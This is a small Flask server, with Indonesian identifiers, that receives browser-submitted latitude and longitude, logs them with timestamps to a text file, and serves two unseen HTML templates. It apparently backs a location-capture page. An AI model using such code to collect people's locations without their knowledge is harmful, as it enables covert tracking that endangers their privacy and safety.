from flask import Flask, request, jsonify, render_template
from datetime import datetime
from flask_cors import CORS  
import os

app = Flask(__name__, template_folder='templates')
CORS(app)

@app.route('/lokasi', methods=['POST'])
def terima_lokasi():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if latitude and longitude:
        with open("lokasi.txt", "a") as f:
            f.write(f"{waktu} - Latitude: {latitude}, Longitude: {longitude}\n")
        print(f"Location Captured: {latitude}, {longitude}")
        return jsonify({"status": "success", "message": "Location Captured"}), 200
    else:
        return jsonify({"status": "failed", "message": "Location Can't be Reached"}), 400

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/hello')
def hello():
    return render_template("hello.html")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(debug=False, host='0.0.0.0', port=port)
